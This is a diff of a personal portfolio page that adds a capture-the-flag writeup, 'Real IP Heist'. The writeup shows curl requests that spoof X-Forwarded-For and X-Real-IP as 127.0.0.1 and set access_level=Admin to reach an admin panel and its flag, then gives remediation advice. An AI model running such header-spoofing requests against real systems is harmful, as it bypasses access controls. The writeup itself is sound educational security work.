@@ -4,112 +4,159 @@
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title>Real IP Heist — Writeup | Beatrice Mutunga</title>
-
-  <!-- Marked (markdown -> HTML) -->
-  <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
-
-  <!-- Simple styling (dark, readable) -->
+  <link rel="stylesheet" href="../style.css" />
   <style>
-    :root{
-      --bg:#0d1117; --panel:#0f1720; --muted:#9aa5b1; --accent:#f5c542; --link:#58a6ff;
-      --content-width:900px;
-    }
-    html,body{height:100%; margin:0; background:var(--bg); color:#c9d1d9; font-family:Inter,Segoe UI,system-ui,Roboto,"Helvetica Neue",Arial;}
-    .page {
-      max-width: var(--content-width);
-      margin: 36px auto;
+    /* Inline additions to ensure the writeup looks great within your site */
+    .writeup {
+      max-width: 900px;
+      margin: 28px auto;
       padding: 28px;
       background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
-      border-radius:10px;
-      box-shadow: 0 8px 30px rgba(2,6,23,0.6);
+      border-radius: 10px;
+      box-shadow: 0 10px 30px rgba(2,6,23,0.6);
+      color: #c9d1d9;
+      line-height: 1.6;
     }
-    header { display:flex; gap:16px; align-items:center; margin-bottom:18px;}
-    .avatar{ width:72px; height:72px; border-radius:50%; border:3px solid var(--accent); object-fit:cover;}
-    h1{font-size:1.6rem; margin:0; color:white;}
-    .meta{ color:var(--muted); font-size:0.95rem; margin-top:6px;}
-    /* rendered markdown styles */
-    .md-content{ margin-top:18px; line-height:1.65; color:var(--muted); }
-    .md-content h2{ color:var(--accent); margin-top:28px; }
-    .md-content h3{ color:#e6edf3; margin-top:20px;}
-    .md-content p{ color: #c9d1d9; }
-    .md-content code{ background:#071021; padding:4px 8px; border-radius:6px; color:#d6deff; font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", "Courier New", monospace; font-size:0.9em;}
-    pre{ background:#071025; padding:12px; border-radius:8px; overflow:auto; color:#d6deff;}
-    a{ color:var(--link); text-decoration:none;}
-    a:hover{text-decoration:underline;}
-    ul{ margin-left:1.1rem; color:#c9d1d9;}
-    blockquote{ border-left:3px solid #2b3946; padding-left:12px; color:#9fb0bf; background: rgba(255,255,255,0.01); padding:8px 12px; border-radius:6px;}
-    .btn-row{ margin-top:14px; display:flex; gap:8px; flex-wrap:wrap;}
-    .btn{ background:transparent; color:var(--accent); border:1px solid rgba(245,197,66,0.15); padding:8px 12px; border-radius:8px; text-decoration:none;}
-    .nav-back{ font-size:0.95rem; color:var(--muted); text-decoration:none; display:inline-flex; gap:8px; align-items:center;}
-    footer { text-align:center; color:var(--muted); margin-top:22px; font-size:0.9rem;}
-    @media (max-width:720px){
-      .page{ margin:20px; padding:18px; }
-      header{ flex-direction:row; gap:12px; }
-    }
+    .writeup header { display:flex; gap:16px; align-items:center; margin-bottom:18px; }
+    .writeup .avatar { width:72px; height:72px; border-radius:50%; border:3px solid #f5c542; object-fit:cover; }
+    .writeup h1 { margin:0; color: #fff; font-size: 1.6rem; }
+    .meta { color:#9aa5b1; font-size:0.95rem; margin-top:6px; }
+    .lead { color:#c9d1d9; margin-top:12px; }
+    .section-title { color:#f5c542; margin-top:20px; margin-bottom:8px; font-size:1.05rem; }
+    img.md-img { display:block; max-width:100%; border-radius:8px; margin:12px 0; border:1px solid rgba(255,255,255,0.04); }
+    pre { background:#071025; color:#d6deff; padding:14px; border-radius:8px; overflow:auto; font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", "Courier New", monospace; }
+    code.inline { background:#071021; padding:4px 8px; border-radius:6px; color:#d6deff; font-size:0.95em; }
+    .flag { background: linear-gradient(90deg, rgba(245,197,66,0.06), rgba(88,166,255,0.02)); padding:12px; border-radius:8px; color:#fff; display:inline-block; margin-top:8px; }
+    .back-link { display:inline-flex; align-items:center; gap:8px; color:#9aa5b1; text-decoration:none; margin-top:14px; }
+    .section { margin-top:18px; }
+    ul { margin-left:1.1rem; }
+    footer.writeup-foot { text-align:center; color:#8b949e; margin-top:22px; font-size:0.9rem; }
   </style>
 </head>
 <body>
-  <div class="page" id="page">
+  <div class="writeup">
     <header>
       <img class="avatar" src="../assets/img/profile.jpg" alt="Beatrice Mutunga">
       <div>
-        <h1 id="title">Real IP Heist</h1>
-        <div class="meta" id="meta">Technical writeup — reconnaissance • exploitation • post-exploit</div>
+        <h1>Real IP Heist</h1>
+        <div class="meta">Exploit of server trusting client-supplied <code class="inline">X-Forwarded-For</code>/<code class="inline">X-Real-IP</code> headers — Admin access & flag</div>
+        <div class="meta">Posted Oct 5, 2025 · Updated Oct 5, 2025 · By <strong>Beatrice Mutheu Mutunga</strong> · 2 min read</div>
       </div>
     </header>
 
-    <div class="btn-row">
-      <a class="nav-back" href="../index.html">← Back to portfolio</a>
-      <a class="btn" id="rawLink" href="#" target="_blank">Open raw Markdown</a>
-      <a class="btn" id="githubRepo" href="#" target="_blank">Open GitHub Repo</a>
+    <p class="lead"><strong>Exploit of server trusting client-supplied X-Forwarded-For/X-Real-IP headers, obtaining Admin access and the flag.</strong></p>
+    <hr>
+
+    <div class="section">
+      <h3 class="section-title">Real IP Heist — Challenge Writeup</h3>
+
+      <h4>Target / Challenge</h4>
+      <ul>
+        <li><strong>Challenge Name:</strong> Real IP Heist</li>
+        <li><strong>Target URL:</strong> <a href="http://54.72.82.22:8085" target="_blank">http://54.72.82.22:8085</a></li>
+        <li><strong>Description:</strong> “Ever wonder what your network really reveals about you. Not everything is as anonymous as it seems…”</li>
+        <li><strong>Host / Platform:</strong> ctf.safaricom.co.ke</li>
+        <li><strong>Goal:</strong> Exploit server trusting client headers to obtain Admin access and the flag.</li>
+      </ul>
     </div>
 
-    <article class="md-content" id="content">
-      <!-- Markdown will be rendered here -->
-      <p style="opacity:.6">Loading writeup…</p>
-    </article>
+    <div class="section">
+      <h4 class="section-title">Step-by-Step Solution</h4>
 
-    <footer>
-      <p>© 2025 Beatrice Mutheu Mutunga • Built with GitHub Pages</p>
+      <h5>1. Reconnaissance</h5>
+      <p>Visited the target URL in a browser. The page displayed a simple login form with:</p>
+      <ul>
+        <li><strong>Username</strong> (free text input)</li>
+        <li><strong>Access Level</strong> (dropdown with only “User” available)</li>
+        <li><strong>Login button</strong></li>
+      </ul>
+
+      <p><img class="md-img" src="https://github.com/user-attachments/assets/e34d2a2a-bfbc-4843-8dbe-253bf1b20abd" alt="Login form screenshot"></p>
+
+      <h5>2. Analyzing Client-Side Restrictions</h5>
+      <p>Inspected the page source and network activity using browser DevTools. Found client-side JavaScript setting a fixed <code class="inline">X-Forwarded-For</code> header, limiting users to “User” access regardless of input.</p>
+
+      <p><img class="md-img" src="https://github.com/user-attachments/assets/2e5290e7-c514-4164-a9b5-4fccf7be9318" alt="DevTools screenshot"></p>
+      <p><img class="md-img" src="https://github.com/user-attachments/assets/0a59fcd4-ea3e-436b-b62c-25d4ae0c7b84" alt="Network trace screenshot"></p>
+
+      <h5>3. Bypassing Client-Side Restrictions</h5>
+      <p>The server trusted HTTP headers for IP verification. Client-side restrictions can be bypassed by sending custom requests with spoofed headers (e.g., using <code class="inline">curl</code>).</p>
+
+      <h5>4. First <code>curl</code> Request — Gaining Admin Access</h5>
+      <p>Crafted a <code>curl</code> POST to override <code>X-Forwarded-For</code> with <code>127.0.0.1</code> and set <code>access_level=Admin</code> in POST data:</p>
+
+      <pre><code>curl -X POST 'http://54.72.82.22:8085/' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  -H 'X-Forwarded-For: 127.0.0.1' \
+  --data 'username=attacker&access_level=Admin'
+</code></pre>
+
+      <p><strong>Response:</strong></p>
+      <pre><code>&lt;h2&gt;Hello, attacker&lt;/h2&gt;
+&lt;!-- real admin use internal tools --&gt;
+&lt;p&gt;Access level: Admin&lt;/p&gt;
+&lt;p&gt;&lt;a href="/admin"&gt;Go to admin panel&lt;/a&gt;&lt;/p&gt;
+</code></pre>
+
+      <h5>5. Second <code>curl</code> Request — Accessing Admin Panel</h5>
+      <p>Using the same spoofed header, accessed <code>/admin</code>:</p>
+
+      <pre><code>curl -X GET 'http://54.72.82.22:8085/admin' \
+  -H 'X-Forwarded-For: 127.0.0.1' \
+  -H 'X-Real-IP: 127.0.0.1'
+</code></pre>
+
+      <p><strong>Response:</strong></p>
+      <pre><code>&lt;h3&gt;Welcome, admin!&lt;/h3&gt;
+&lt;p&gt;Flag: safctf{c0f1ec1fccb2de4a03031037251f21a7}&lt;/p&gt;
+</code></pre>
+    </div>
+
+    <div class="section">
+      <h4 class="section-title">Vulnerability Analysis</h4>
+      <p><strong>Critical Security Flaw:</strong> The application trusted client-supplied headers for authentication decisions.</p>
+      <p><strong>Specific Issues:</strong></p>
+      <ul>
+        <li>Server used <code>X-Forwarded-For</code> and <code>X-Real-IP</code> headers to verify internal/trusted IPs.</li>
+        <li>Spoofing headers to <code>127.0.0.1</code> bypassed access controls.</li>
+        <li><code>access_level</code> parameter was vulnerable to direct manipulation.</li>
+        <li>Client-side restrictions provided a false sense of security.</li>
+      </ul>
+
+      <h4 class="section-title">Flag</h4>
+      <div class="flag">safctf{c0f1ec1fccb2de4a03031037251f21a7}</div>
+    </div>
+
+    <div class="section">
+      <h4 class="section-title">Key Takeaways</h4>
+      <ul>
+        <li>Never trust client-supplied headers for security decisions.</li>
+        <li>Client-side restrictions are easily bypassed and should not be relied upon for access control.</li>
+        <li>Always validate authentication and authorization on the server side.</li>
+        <li>IP-based authentication can be vulnerable to header injection attacks.</li>
+        <li>Security through obscurity (hidden admin endpoints) is not effective protection.</li>
+      </ul>
+
+      <h4 class="section-title">Remediation Recommendations</h4>
+      <ol>
+        <li>Do not rely on <code>X-Forwarded-For</code> or other client-controllable headers for trust decisions. Use a trusted reverse proxy that strips/sets these headers.</li>
+        <li>Validate and enforce <code>access_level</code> server-side; never accept privilege escalation via POST parameters.</li>
+        <li>Implement proper authentication/authorization (session tokens, role checks) that cannot be manipulated from the client.</li>
+        <li>Harden servers to only trust forwarding headers from verified proxies and monitor ASN/IP ranges where appropriate.</li>
+        <li>Log and monitor suspicious header manipulations and failed attempts.</li>
+      </ol>
+    </div>
+
+    <div class="section">
+      <h4 class="section-title">Notes</h4>
+      <p>All testing described above was performed in the context of the CTF challenge as provided by the target URL.</p>
+    </div>
+
+    <a class="back-link" href="../index.html">← Back to portfolio</a>
+
+    <footer class="writeup-foot">
+      © 2025 Beatrice Mutheu Mutunga • Writeup converted from Markdown
     </footer>
   </div>
-
-  <script>
-    // path to your markdown file (adjust if your writeups.md is located in a different folder)
-    const mdPath = '../writeups.md'; // <-- change path if needed (example: '../REAL-IP-HEIST/writeups.md' or './writeups.md')
-
-    // link targets: raw markdown & GitHub repo (auto-construct if possible)
-    const rawUrl = window.location.origin + '/' + (mdPath.replace(/^\.\//, '').replace(/^\.\.\//,'')); // works for same-repo relative paths
-    document.getElementById('rawLink').href = mdPath;
-    // optional: set repo link if known
-    document.getElementById('githubRepo').href = 'https://github.com/beatrice-mutunga/REAL-IP-HEIST';
-
-    // Fetch markdown and render using marked
-    fetch(mdPath)
-      .then(resp => {
-        if (!resp.ok) throw new Error('Could not fetch markdown: ' + resp.status);
-        return resp.text();
-      })
-      .then(md => {
-        // Optional: pick title and meta from first lines of markdown
-        try {
-          const firstLine = md.split('\\n').find(l => l.trim().length>0);
-          if (firstLine && firstLine.startsWith('#')) {
-            document.getElementById('title').textContent = firstLine.replace(/^#+/,'').trim();
-          }
-        } catch(e) {/*ignore*/}
-        // Convert markdown to HTML
-        const html = marked.parse(md, { gfm: true, breaks: true });
-        document.getElementById('content').innerHTML = html;
-        // make all external links open in new tab
-        document.querySelectorAll('#content a').forEach(a => {
-          const href = a.getAttribute('href') || '';
-          if (href.startsWith('http')) a.setAttribute('target','_blank');
-        });
-      })
-      .catch(err => {
-        document.getElementById('content').innerHTML = '<p style="color:#ff8b8b">Error loading writeup: ' + err.message + '</p>';
-      });
-  </script>
 </body>
 </html>
